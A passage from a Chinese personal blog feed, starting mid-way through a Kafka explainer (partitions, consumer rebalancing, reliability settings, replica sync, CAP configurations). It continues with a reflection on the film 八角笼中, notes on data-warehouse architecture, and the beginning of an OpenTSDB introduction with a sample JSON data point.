段"></a>（4）Segment 段</h2><blockquote><p>partition物理上由多个segment组成。</p></blockquote><h2 id="（5）offset-偏移量"><a href="#（5）offset-偏移量" class="headerlink" title="（5）offset 偏移量"></a>（5）offset 偏移量</h2><blockquote><p>每个partition都由一系列有序的、不可变的消息组成，这些消息被连续的追加到partition中。partition中每个消息都有一个连续的序号叫做offset，用于partition唯一标记一条信息。</p></blockquote><h2 id="（6）Leader-x2F-Follower-主副本-x2F-从副本"><a href="#（6）Leader-x2F-Follower-主副本-x2F-从副本" class="headerlink" title="（6）Leader&#x2F;Follower 主副本&#x2F;从副本"></a>（6）Leader&#x2F;Follower 主副本&#x2F;从副本</h2><blockquote><p>分区的副本。为了保障数据的高可用，分区都会有一些副本，每个分区都会有一个leader主副本负责读写数据，follower从副本只负责同步leader主副本数据，不对外提供服务。</p></blockquote><h2 id="（7）Consumer-group-消费者组"><a href="#（7）Consumer-group-消费者组" class="headerlink" title="（7）Consumer group 消费者组"></a>（7）Consumer group 消费者组</h2><blockquote><p>消费者组，由多个消费者组成，一个组内只会有一个消费者去消费一个分区的消息。</p></blockquote><h2 id="（8）Coordinator-协调者"><a href="#（8）Coordinator-协调者" class="headerlink" title="（8）Coordinator 协调者"></a>（8）Coordinator 协调者</h2><blockquote><p>协调者，主要是为消费者组分配分区以及重平衡操作（Rebalance）。</p></blockquote><h2 id="（9）Producer-生产者"><a href="#（9）Producer-生产者" class="headerlink" title="（9）Producer 生产者"></a>（9）Producer 生产者</h2><blockquote><p>生产者，负责发送消息</p></blockquote><h2 id="（10）Consumer-消费者"><a href="#（10）Consumer-消费者" class="headerlink" title="（10）Consumer 消费者"></a>（10）Consumer 消费者</h2><blockquote><p>消费者，负责消费消息</p></blockquote><h1 id="三、消息队列模型"><a href="#三、消息队列模型" class="headerlink" title="三、消息队列模型"></a>三、消息队列模型</h1><blockquote><p>对于传统的消息队列系统支持两个模型：点对点、发布订阅；</p><ul><li>点对点：消息只能被一个消费者消费，消费完后就删除</li><li>发布订阅：相当于广播模式，消息可以被所有的消费者消费</li></ul><p>Kafka通过消费者组实现了同时支持上述2个模型，如果说消费者都属于一个消费者组，那么消息只能被一个消费者消费，即点对点的模型；如果每个消费者都是一个单独的消费者组，那么便是发布订阅模型。</p></blockquote><h1 id="四、kafka-通信过程原理"><a href="#四、kafka-通信过程原理" class="headerlink" title="四、kafka 通信过程原理"></a>四、kafka 通信过程原理</h1><blockquote><ol><li>生产者启动的时候会指定bootstrap.servers，通过指定的broker地址，kafka就会和这些broker创建tcp连接。</li><li>连接到任意一台broker之后，然后发送获取元数据请求（有哪些主题、主题有哪些分区、分区有哪些副本、分区的主从副本等信息）</li><li>接着创建和所有的broker的tcp连接</li><li>发送消息</li><li>消费者和生产者一样，也会指定bootstrap.servers属性，然后选择一台broker创建tcp连接，发送请求到找到协调者所在的broker</li><li>再和协调者broker创建tcp连接，获取元数据</li><li>根据分区leader节点所在的broker节点，和这些broker分别创建连接</li><li>消费消息</li></ol></blockquote><p><img src="/blog/c8b53445.html/image-20240304235511766.png" alt="image-20240304235511766"></p><h1 id="五、发送消息时如何选择分区"><a href="#五、发送消息时如何选择分区" class="headerlink" title="五、发送消息时如何选择分区?"></a>五、发送消息时如何选择分区?</h1><blockquote><p>主要有两种方式：</p><ol><li>轮询，安装顺序消息依次发送到不同的分区</li><li>随机，随机发送到某个分区</li></ol><p>如果消息指定key，那么会根据消息的key进行hash，然后对partition数量取模，绝对落在哪个分区上。所以，对于相同key的消息来说，总会发送到一个分区上，也就是我们常常说的消息分区有序性。</p></blockquote><h1 id="六、分区的意义及优势？"><a href="#六、分区的意义及优势？" class="headerlink" title="六、分区的意义及优势？"></a>六、分区的意义及优势？</h1><blockquote><p>若不分区的话，消息只能落在一个节点上，这样就算再好的服务器，性能也是承受不住的。</p><p>实际上，分布式系统都面临这个问题，要么收到消息时，进行消息切分，要么提前切分。kafka选择了前者，通过分区可以把数据均匀的分布到不同节点。</p><p>分区带来负载均衡和横向扩展的能力。</p><p>发送消息时可以根据分区的数量落在不同的kafka服务器节点上，提升了并发写消息的性能，消费消息的时候有和消费者绑定了关系，可以从不同节点的不同分区消费消息，提高的读取消息的能力。</p><p>另外一个就是分区引入了副本，冗余的副本保证了kafka的高可用和高持久性。</p></blockquote><h1 id="七、消费者组和消费者重平衡"><a href="#七、消费者组和消费者重平衡" class="headerlink" title="七、消费者组和消费者重平衡"></a>七、消费者组和消费者重平衡</h1><blockquote><p>kafka中消费者组订阅topic主题的消息，一般来说消费者的数量最好和所有主题分区的数量保持一一致。</p><ul><li>消费者数量&lt;分区数量，必然会有一个消费者消费多个分区</li><li>消费者数量&gt;分区数量，必然有一个消费者没有分区可以消费</li></ul></blockquote><p><img src="/blog/c8b53445.html/image-20240305001717005.png" alt="image-20240305001717005"></p><blockquote><p>消费者消费的分区是怎么分配的，有先加入的消费者时候怎么办？</p><p>由协调器来组织完成，每一次新的消费者加入消费者组时，都会先向协调器发送请求，从而获取分区的分配，这个分区分配的算法逻辑由协调者来完成。</p><p>重平衡就是指有新消费者加入的情况。例如起初我们只有消费者A在消费数据，后来加入了消费者B和C，这时候分区就需要被重新分配了，这就是重平衡，也叫做再平衡，这个期间会导致整个消费者停止工作，重平衡期间都无法消费消息。</p><p>发送重平衡的决定因素：消费者数量、主题数量（用正则订阅的主题）、分区数量，其中任何一个改变都会触发重平衡</p><p>重平衡的过程：</p><p>重平衡的机制依赖于消费者和协调器直接的心跳来维持，消费者会有一个独立的线程会定时去发送心跳给协调者，可以通过heartbeat.interval.ms来控制发送心跳的间隔时间。</p><ol><li>每个消费者第一次加入组的时候都会向协调者发送join group请求，第一个发送请求的消费者会成为“群主”，协调者会返回群成员列表给群主</li><li>群主执行分区分配策略，然后把分配结果通过sync group请求发送给协调者，协调者收到分区分配结果</li><li>其他成员想协调者发送 sync group，协调者把每个消费者的分区分别响应给他们</li></ol></blockquote><p><img src="/blog/c8b53445.html/image-20240305003002497.png" alt="image-20240305003002497"></p><h1 id="八、分区分配策略"><a href="#八、分区分配策略" class="headerlink" title="八、分区分配策略"></a>八、分区分配策略</h1><blockquote><p>主要有3种分配策略：</p><p>range，默认策略，对分区进行排序，越靠前的消费者能够分配到的分区数越多。</p><p><img src="/blog/c8b53445.html/image-20240305003219550.png" alt="image-20240305003219550"></p><p>默认策略的弊端（根据主题进行分配的）在于如果消费者组订阅了多个主题，就可能会导致分区分配不均衡。</p><p><img src="/blog/c8b53445.html/image-20240305003639102.png" alt="image-20240305003639102"></p><p>RoundRobin</p><p>这个就是我们常说的轮询，会根据所有的主题进行轮询分配，不会出现range那种主题越多可能导致分区分配不均衡的问题。</p><p><img src="/blog/c8b53445.html/image-20240305003908189.png" alt="image-20240305003908189"></p><p>Sticky</p><p>粘性策略：在分配均衡的前提下，让分区的分配更小的改动。</p><p>比如P0\P1分配给消费者A，那么下一次尽量还是分配给A。这样做的好处是连接可以复用，要消费消息总是要和broker去连接的，如果能保持上一次分配分区的话，那就不用频繁的销毁创建连接了。</p></blockquote><h1 id="九、如何保证消息可靠？"><a href="#九、如何保证消息可靠？" class="headerlink" title="九、如何保证消息可靠？"></a>九、如何保证消息可靠？</h1><blockquote><p>什么是消息可靠？就是如何确保消息一定能发送到服务器并进行存储，并且发生宕机等异常场景，能够从备份数据中恢复。</p><p>消息的可靠性需要从3方面来保证：</p><ul><li>第一：发送端能否保证发送的消息是可靠的</li><li>第二：kafka broker 自身保证不丢数据，安全落盘</li><li>第三：接收端能够可靠的消费消息</li></ul><p>发送端：通过ack机制，定义不同策略。</p><p>发送端如何保证高可用？源于kafka健壮的副本（replication）策略。通过调节其副本相关参数，可以使得kafka在性能和可靠性之间运转的游刃有余。replication的数量可以在server.properties中配置。</p><p>kafka中的消息是以topic进行分类的，生产者通过topic向kafka broker发送消息，消费者通过topic读取数据。然而topic在物料层面又能以partition为分组，一个topic可以分成若干个partition，kafka中的消息又以顺序的方式存储在文件中。</p><p>kafka中的topic的partition有N个副本（replicas）。N个replicas中，其中一个replicas为leader，其他都是follower，leader处理partition中的读写请求，其余follower定期去复制leader上的数据。</p><p>如果leader发生故障或者挂掉，一个新的leader被选举并接收客户端的消息成功写入。kafka确保从同步副本列表中选举一个副本为leader。</p><p>当生产者向leader发生数据时，可以通过request.required.acks参数来设置可靠性的级别：</p><p>1：默认级别，意味着生产者在ISR中的leader已成功收到数据并确认后发送下一条信息。如果leader宕机了，则会丢失数据。</p><p>0：这个意味着生产者无需等待来着broker的确认而继续发送下一批消息，这种情况下消息的传输效率是最高的，但数据可靠性是最低的。此时retires参数失效，因为客户端无法判断是否失败，也就无法重试。</p><p>all&#x2F;-1：生产者需要等待ISR中所有的follower都确认接收到数据后才算完成一次发送，可靠性最高，但这样也不能保证数据不丢失，比如ISR中只有一个leader时，就会变成acks&#x3D;1的情况。</p><p>retries &#x3D; N，设置一个非常大的值，让生产者发送消息失败后不断重试。</p><p>kafka自身：消息的写入是通过page cache异步写入磁盘的，因此仍然存在丢失消息的可能。针对kafka自身丢消息可能设置的参数：</p><ul><li>replication.factor&#x3D;N，设置一个较大的值，保证至少有2个或以上的副本；</li><li>min.insync.replicas&#x3D;N，代表消息如何才能被认为是写入成功，设置大于1的数，保证至少写一个或者以上的副本才算写入成功</li><li>unclear.leader.election.enable&#x3D;false，这个设置意味着没有完全同步的分区副本不能成为leader副本，如果true的话，那些没有完全同步的副本成为leader副本后，就会有消息丢失的风险。</li></ul><p>接收到：若配置了自动提交，万一消费的数据没有处理完，就自动提交了offset，然后consumer直接宕机了，未处理完的数据丢失了，下次也消费不到了。故而消费端是靠offset来保证的。</p><p>消费者丢失数据，通过关闭自动提交即可，改为业务处理成功后手动提交。</p><p>因为重平衡发送的时候，消费者会去读上一次的偏移量，自动提交默认是5秒一次，这个会导致重复消费或者丢失消息。</p><p>enable.auto.commit&#x3D;false，设置为手动提交。</p><p>auto.offset.reset&#x3D;earliest，这个参数代表没有偏移量可以提交或者broker上不存在偏移量的时候，消费者如何处理。earliest代表从分区的开始位置读取，可能会重复读取消息，但不会丢失。另外一种latest表示从末尾读取，有概率丢失消息。</p></blockquote><h1 id="十、副本同步原理"><a href="#十、副本同步原理" class="headerlink" title="十、副本同步原理"></a>十、副本同步原理</h1><blockquote><p>Kafka的副本分为leader主副本和follower从副本。其中只有leader主副本会对外提供辅助，follower从副本只负责与leader保持数据同步，作为数据冗余容灾的作用。</p><p>在Kafka中所有的副本集合统称为AR（assigned replicas），和leader主副本保持同步的副本集合称之为ISR（InSyncReplicas）</p><p>ISR是一个动态集合，维持这个集合通过replica.lag.time.max.ms参数来控制，这个代表落后leader副本的最长时间，默认为10秒，所以只要follower副本没有落后leader副本10秒以上，就认为是和leader是同步的</p><p>HW（high watermark）：高水位，也叫做复制点，表示副本间同步的位置。</p><p>LEO（log end offset）：下一条待写入消息的位移</p><p>如下图所示，0<del>4绿色表示已经提交的消息，这些消息已经在副本之间进行同步，消费者可以看见这些消息并且进行消费，4</del>6黄色的则是表示未提交的消息，可能还没有在副本间同步，这些消息对于消费者是不可见的。</p><p><img src="/blog/c8b53445.html/640.jpeg" alt="图片"></p><p>副本间同步的过程依赖的就是HW和LEO的更新，以他们的值变化来演示副本同步消息的过程，绿色表示Leader副本，黄色表示Follower副本。</p><p>首先，生产者不停地向Leader写入数据，这时候Leader的LEO可能已经达到了10，但是HW依然是0，两个Follower向Leader请求同步数据，他们的值都是0。</p><p><img src="/blog/c8b53445.html/image-20240305012659056.png" alt="image-20240305012659056"></p><p>然后，消息还在继续写入，Leader的LEO值又发生了变化，两个Follower也各自拉取到了自己的消息，于是更新自己的LEO值，但是这时候Leader的HW依然没有改变。</p><p><img src="/blog/c8b53445.html/image-20240305012712392.png" alt="image-20240305012712392"></p><p>此时，Follower再次向Leader拉取数据，这时候Leader会更新自己的HW值，取Follower中的最小的LEO值来更新。</p><p><img src="/blog/c8b53445.html/image-20240305012730661.png" alt="image-20240305012730661"></p><p>之后，Leader响应自己的HW给Follower，Follower更新自己的HW值，因为又拉取到了消息，所以再次更新LEO，流程以此类推。</p><p><img src="/blog/c8b53445.html/image-20240305012740752.png" alt="image-20240305012740752"></p></blockquote><h1 id="十一、Kafka为什么快？"><a href="#十一、Kafka为什么快？" class="headerlink" title="十一、Kafka为什么快？"></a>十一、Kafka为什么快？</h1><blockquote><ul><li>顺序IO：kafka写消息到分区采用顺序追加的方式，也就是顺序写入磁盘，不是随机写入，这个速度比普通的随机IO快非常多，几乎可以和网络IO相媲美。</li><li>Page Cache 和零拷贝：kafka在写入消息数据的时候通过mmap内存映射的方式，不是真正立刻写入磁盘，而是利用操作系统的文件缓存page cache异步写入，提高写入消息的性能，另外消费消息的时候又通过sendfile实现了零拷贝。</li><li>批处理和压缩：kafka发送消息时，不是一条条的发送的，而是会把多条消息合并为一个批次进行处理发送，消费也是一个道理一次拉取一批次的消息进行消费。并且producer、broker、consumer都使用了优化后的压缩算法，发送和消费消息使用压缩节省了网络传输的开销，broker存储使用压缩降低了磁盘存储空间。</li></ul></blockquote><h1 id="十二、CAP原理"><a href="#十二、CAP原理" class="headerlink" title="十二、CAP原理"></a>十二、CAP原理</h1><blockquote><p>CAP是“一致性（Consistency）、可用性（Availability）以及分区容忍性（Partition Tolerance）”的缩写。</p><p>1）C 即一致性（Consistency）：要求分布式系统要保障，一旦数据写入到分布式存储系统之后，所有访问数据的请求不管是访问分布式存储的那个节点上，查到到该写入的数据都是一致的，不能出现3个副本中有的副本有该条数据，有的副本没有该条数据（插入问题），更不能是有的副本该条数据和另外一个副本该条数据是不一样的（更新问题）。</p><p>2）A 即可用性（Availability）：可用性就是要求分布式系统要保障，一旦数据写入到分布式存储系统之后，所有访问该数据的请求都可以正常响应，不管该数据能不能查到，又或者该条数据查出来的一不一致，不能出现查询该数据时出现长期等待或者报错的发生。</p><p>3）P 即分区容忍性 （Partition Tolerance）：分区容忍性时要求分布式系统要保障，一旦数据写入到分布式存储系统的主本文件后，因为网络的的问题无法同步到副本的时候，系统依然能够对外提供服务，网络在分布式系统来讲是不敢绝对保障的，如果因为网络问题，导致写入数据无法向副本同步，这时候就是分区的情况出现，但网络的绝对的可靠从科学角度上来讲是无法做到的，因此，所有分布式系统必须是满足“P”的存在，不然就只能使用单机系统来解决，那就不是分布式系统了。</p><p>综上所述，分布式系统基本上所有的都必须满足“P”，在“A”和“C”之间来选择，要么是AP，要么是CP。</p><p>CAP原理定义的就是3个原则在分布式存储系统中只能满足其中两个，无法全部都满足，因为要求网络绝对的可靠是不可能的，因此，所有的分布式系统都必须满足P，然后AP和CP之间做出抉择，是保性能牺牲一致（AP），或者是保一致牺牲性能（CP）要根据实际的应用场景来确定。</p><p>Kafka提供了一些配置，用户可以根据具体的业务需求，进行不同的配置，使得Kafka满足AP或者CP，或者它们之间的一种平衡。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">比如下面这种配置，就保证强一致性，使得Kafka满足CP。任意写入一条数据，都需要等到replicate到所有节点之后才返回ack；接下来，在任意节点都可以消费到这条数据，即是在有节点宕机的情况下，包括主节点。</span><br><span class="line"></span><br><span class="line">replication.factor = 3</span><br><span class="line">min.insync.replicas = 3</span><br><span class="line">acks = all</span><br><span class="line"></span><br><span class="line">而下面的配置，就主要保证可用性，使得Kafka满足AP。对于任意写入一条数据，当主节点commmit了之后就返回ack；如果主节点在数据被replicate到从节点之前就宕机，这时，重新选举之后，消费端就读不到这条数据。这种配置，保证了availability，但是损失了consistency。</span><br><span class="line"></span><br><span class="line">replication.factor = 3</span><br><span class="line">min.insync.replicas = 3</span><br><span class="line">acks = 1</span><br><span class="line"></span><br><span class="line">还有一种配置是公认比较推荐的一种配置，基于这种配置，损失了一定的consistency和availability，使得Kafka满足的是一种介于AP和CP之间的一种平衡状态。因为，在这种配置下，可以在容忍一个节点（包括主节点）宕机的情况下，任然保证数据强一致性和整体可用性；但是，有两个节点宕机的情况，就整体不可用了。</span><br><span class="line"></span><br><span class="line">replication.factor = 3</span><br><span class="line">min.insync.replicas = 2</span><br><span class="line">acks = all</span><br></pre></td></tr></table></figure><p>对于这种配置，其实Kafka不光可以容忍一个节点宕机，同时也可以容忍这个节点和其它节点产生网络分区，它们都可以看成是Kafka的容错（Fault tolerance）机制。</p><p>除了上面的几个常用配置项，下面这个配置项也跟consistency和availability相关。这个配置项的作用是控制，在所有节点宕机之后，如果有一个节点之前不是在ISR列表里面，启动起来之后是否可以成为leader。当设置成默认值false时，表示不可以，因为这个节点的数据很可能不是最新的，如果它成为了主节点，那么就可能导致一些数据丢失，从而损失consistency，但是却可以保证availability。如果设置成true，则相反。这个配置项让用户可以基于自己的业务需要，在consistency和availability之间做一个选择。</p><p>unclean.leader.election.enable&#x3D;false</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每日分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八角笼中</title>
      <link href="/blog/667e5b09.html/"/>
      <url>/blog/667e5b09.html/</url>
      
        <content type="html"><![CDATA[<h1 id="八角笼中"><a href="#八角笼中" class="headerlink" title="八角笼中"></a><center>八角笼中</center></h1><p><img src="/blog/667e5b09.html/%E5%85%AB%E8%A7%92%E7%AC%BC%E4%B8%AD.jpg" alt="八角笼中"></p><p>​生活是牢笼，也是枷锁，人这一生到底为了什么，其实就是两个字，钱和情，为了这两个字尝尽了人生的酸甜苦辣，复杂的社会，看不透的人心，放不下的责任，走不完的坎坷，越不过的无奈，撑过的日子只有自己知道，该经历的不该经历的全经历了，该忍受的不该忍受的都一一吞下了，还畏惧什么呢？</p><p>​所以，你要相信，任何时候，命运给你一个比别人低的起点，是想告诉你，是让你用你的一生去奋斗出一个绝地反击的故事，破笼而出，博出生路，这个故事关于独立，关于梦想，关于勇气，关于坚忍，他不是一个水到渠成的童话，没有一点点人间疾苦，这个故事是有志者事竟成，破釜沉舟，百二秦关终属楚，这个故事是苦心人天不负，卧薪尝胆，三千越甲可吞吴 。</p><p>​—— 生如野草 不屈不挠</p><p><img src="/blog/667e5b09.html/%E8%8B%8F%E6%9C%A82.jpg" alt="苏木2"></p><p>​生如野草，不屈不挠，没有伞的孩子只有努力奔跑，我们无法选择人生的起点，但可以决定人生的终点。只有登上山顶才能看到那一边的风光，剩下的只管努力与坚持，时间会给我们答案。</p><p>​没有背景，也没有依靠，就是一个平凡而普通的人，想要的都只是踮起脚尖努力争取。虽然生活很难，但不努力，日子更难…</p><p>​     —— 加油，普通人</p><p><img src="/blog/667e5b09.html/%E8%8B%8F%E6%9C%A83.jpg" alt="苏木3"></p><h2 id="经典台词"><a href="#经典台词" class="headerlink" title="经典台词"></a>经典台词</h2><ul><li>我们无法选择自己的起点，但可以决定人生的终点。</li><li>动手之前，先想清楚，不然后果要自己承担。</li><li>选择比努力更重要，你做你擅长的事，我去做我擅长的事，一切都还来得及。</li><li>破笼而出，博出生路。</li><li>人生亦云的有很多，逆流而上的寥寥无几。大浪淘沙，谁主沉浮，自有定律。</li><li>知道打水漂吗？不论你把石头打出去飘多远，这块石头最终都会沉下去。</li><li>生活既是囚笼也是枷锁。放弃就是认命，争取就是垫脚石。</li><li>人们通常都更愿意相信他们想要相信的东西。</li><li>不是所有人都会得到他们想要的，但却有一些人会得到他们应得的。</li><li>青春犹如八角笼中的拳击手，需要勇往直前才能展示自己的价值和力量。</li><li>我姐一辈子就想出那个村子，但她那样子出不去嘞。我就想能拿冠军，能去很远嘞地方，告诉她外面的世界是什么样子。</li><li>做好自己的事情，不要管别人的评价和看法。</li><li>人生不可预知，但我们可以坚定自己的方向。</li><li>格斗就是我们这辈子唯一的出路。</li><li>或许路不相同，可谁又不是在笼子，没有伞的孩子，只能努力奔跑。</li><li>只有登上山顶才能看到那一边的风光，剩下的只管努力与坚持，时间会给我们最后的答案！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 电影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数仓项目-概念及架构</title>
      <link href="/blog/e250d75f.html/"/>
      <url>/blog/e250d75f.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：采集项目-amp-数据仓库项目的区别"><a href="#一：采集项目-amp-数据仓库项目的区别" class="headerlink" title="一：采集项目&amp;数据仓库项目的区别"></a>一：采集项目&amp;数据仓库项目的区别</h1><ol><li><p>从功能角度：</p></li><li><ol><li>采集：以数据为主，传输为主；</li><li>数仓：以数据的计算为主，同时也能存储数据；</li></ol></li><li><p>从技术角度：</p></li><li><ol><li>采集：flume、kafka、datax、maxwell</li><li>数仓：mysql、hdfs、spark、flink、mr、hive</li></ol></li></ol><h1 id="二：数据库和数据仓库的区别"><a href="#二：数据库和数据仓库的区别" class="headerlink" title="二：数据库和数据仓库的区别"></a>二：数据库和数据仓库的区别</h1><ol><li><p>从名称上区分：</p></li><li><ol><li>数据库：database（基础、核心的数据）</li><li>数据仓库：data warehouse（货栈、大商店、小卖店），注重于对外提供服务</li></ol></li><li><p>从数据的来源区分：</p></li><li><ol><li>数据库：企业中基础核心的业务数据</li><li>数据仓库：数据库中的数据</li></ol></li><li><p>从数据存储的角度区分：</p></li><li><ol><li>数据库：核心作用是查找业务数据</li></ol></li><li><ol><li><ol><li>如何存储有利于查询：行式存储（底层使用索引），不能存储海量数据；</li></ol></li></ol></li><li><ol><li>数据仓库：统计分析数据</li></ol></li><li><ol><li><ol><li>如何存储有利于统计、分析：列式存储，可以存储海量数据；</li></ol></li></ol></li><li><p>从数据的价值区分：</p></li><li><ol><li>数据库：保障全企业、全业务的正常运行；</li><li>数据仓库：将数据的统计的结果为企业的经营决策提供数据支撑；</li></ol></li><li><ol><li><ol><li>数据仓库不是数据流转的终点，需要将统计的结果通过可视化呈现；</li></ol></li></ol></li></ol><h1 id="三：数据流转的过程"><a href="#三：数据流转的过程" class="headerlink" title="三：数据流转的过程"></a>三：数据流转的过程</h1><ol><li><ol><li>用户</li><li>业务服务器</li><li>数据存储：行为数据库（文件）</li><li>数据的统计分析：数据仓库</li><li>数据可视化</li></ol></li></ol><h1 id="四：数据统计分析的基本步骤"><a href="#四：数据统计分析的基本步骤" class="headerlink" title="四：数据统计分析的基本步骤"></a>四：数据统计分析的基本步骤</h1><ol><li><p>确定数据源；</p></li><li><p>加工数据；（可以过滤、补全、脱敏等）</p></li><li><p>统计数据；</p></li><li><p>分析数据；</p></li><li><ol><li>spark on hive；（spark 解析 sql）</li><li>hive on spark；（hive 解析 sql）</li></ol></li></ol><h1 id="五：数据仓库-架构"><a href="#五：数据仓库-架构" class="headerlink" title="五：数据仓库-架构"></a>五：数据仓库-架构</h1><p>如果将数据库（MySQL）直接作为数据仓库的数据源，存在的问题：</p><ol><li><p>业务数据库的数据存储为行式存储，而数据仓库的数据要求为列式存储；</p></li><li><ol><li>数据不能直接对接：行式数据转换为列式数据</li></ol></li><li><p>业务数据库中存储的数据不是海量数据，但数据仓库要求为海量数据；</p></li><li><ol><li>数据不能直接对接：数据量不够</li></ol></li><li><p>数据库不是为数据仓库服务的</p></li><li><ol><li>数据仓库在对接数据库数据时，会对数据库的性能造成影响；</li><li>数据仓库应该设计一个自己的数据源；</li></ol></li><li><ol><li><ol><li>同步数据库数据，为了代替和补充数据库；</li><li>汇总数据库数据（海量数据）</li></ol></li></ol></li></ol><h1 id="六：数据采集和数据仓库-架构"><a href="#六：数据采集和数据仓库-架构" class="headerlink" title="六：数据采集和数据仓库-架构"></a>六：数据采集和数据仓库-架构</h1><p>数据仓库中的数据源需要从数据库中周期性（以天为单位）同步；一般情况下，这个同步的过程，称之为“采集”；</p><p>数据采集的时候，如果想要将数据同步到数据仓库的数据源，那么就必须知道业务数据库的表结构；那么采集项目和数据仓库项目就存在耦合性，因此需要解耦合，解耦合的核心就在于增加中间件；数据源为文件或者表，因此最好的中间件就是HDFS；</p><p><img src="/blog/e250d75f.html/1704212740438-0dced7e4-1274-4288-973f-d2c865c38e71.png" alt="img"></p><p><img src="/blog/e250d75f.html/1704212766094-dd64e588-44c5-4965-9d2f-b2678047e7d0.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 数仓项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenTSDB原理、存储及查询</title>
      <link href="/blog/3af10b62.html/"/>
      <url>/blog/3af10b62.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>OpenTSDB（Open Time Series Database）是一个用于存储和检索时间序列数据的分布式、可扩展的开源数据库系统。它特别适用于大规模、高性能的监控和分析应用程序，如网络监控、服务器性能监控、传感器数据存储等。</p><h1 id="二：特点"><a href="#二：特点" class="headerlink" title="二：特点"></a>二：特点</h1><ol><li><strong>时间序列数据存储：</strong> OpenTSDB 主要用于存储时间序列数据，这是一种按时间顺序存储的数据，通常表示随时间变化的测量数据，如服务器负载、传感器读数、网络流量等。</li><li><strong>分布式架构：</strong> OpenTSDB 采用分布式架构，可以在多台服务器上存储和查询大量时间序列数据。这使得它适用于大规模的数据集和高负载应用。</li><li><strong>快速插入和查询：</strong> OpenTSDB 针对高性能而设计，可以快速插入和查询时间序列数据。它使用 HBase 作为后端存储引擎，具有高度优化的数据检索机制。</li><li><strong>多维数据模型：</strong> OpenTSDB 具有多维数据模型，允许您为不同的时间序列数据添加标签和标识。这可以帮助您组织和查询数据，以满足各种需求。</li><li><strong>开源：</strong> OpenTSDB 是开源项目，基于 Apache 2.0 许可证，可以免费使用和定制。</li><li><strong>社区支持：</strong> OpenTSDB 拥有活跃的社区支持，这意味着您可以获得各种文档、教程和插件，以满足不同应用程序的需求。</li><li><strong>可扩展性：</strong> OpenTSDB 具有良好的可扩展性，可以轻松地添加新数据源、添加新查询函数和支持更多数据点。</li><li><strong>生态系统集成：</strong> OpenTSDB 可以集成到各种监控和数据分析生态系统中，如 Grafana、Prometheus、Elasticsearch 等。</li></ol><h1 id="三：JSON格式数据的存储"><a href="#三：JSON格式数据的存储" class="headerlink" title="三：JSON格式数据的存储"></a>三：JSON格式数据的存储</h1><p>在OpenTSDB中，使用JSON格式输入数据通常遵循以下原理和实现过程：</p><h2 id="3-1-数据结构定义"><a href="#3-1-数据结构定义" class="headerlink" title="3.1 数据结构定义"></a>3.1 数据结构定义</h2><p>JSON格式数据在OpenTSDB中遵循特定的结构和字段约定。典型的JSON格式数据包括以下关键字段：</p><ul><li><strong>metric</strong>: 表示时间序列数据的名称或指标。</li><li><strong>timestamp</strong>: 表示数据点的时间戳。</li><li><strong>value</strong>: 表示数据点的值。</li><li><strong>tags</strong>: 用于标记和描述数据点的附加信息，通常是键值对的形式，例如设备ID、地理位置等。</li></ul><h2 id="3-2-数据示例"><a href="#3-2-数据示例" class="headerlink" title="3.2 数据示例"></a>3.2 <strong>数据示例</strong></h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;metric&quot;</span><span class="punctuation">:</span> <span class="string">&quot;temperature&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1637016000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">25.5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sensor_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;12345&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;room_1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这个示例表示了一个名称为 “temperature” 的时间序列数据点，其时间戳为 1637016000，值为 25.5，同时包含了两个标签：<strong>sensor_id</strong>为 “12345” 和 <strong>location</strong>为 “room_1”。</p><h2 id="3-3-数据导入过程"><a href="#3-3-数据导入过程" class="headerlink" title="3.3 数据导入过程"></a>3.3 <strong>数据导入过程</strong></h2><p>OpenTSDB提供了API或工具，允许用户将符合JSON格式的数据导入到数据库中。用户可以使用HTTP请求或命令行工具等方式将数据发送到OpenTSDB的数据输入端点。</p><ul><li>对于HTTP请求方式，通常是通过POST请求将JSON数据发送到OpenTSDB的API端点。</li><li>命令行工具如 <strong>tsdb-cli</strong> 或其他类似工具也可以被用来从命令行发送JSON格式的数据到OpenTSDB。</li></ul><h2 id="3-4-数据处理和存储"><a href="#3-4-数据处理和存储" class="headerlink" title="3.4 数据处理和存储"></a>3.4 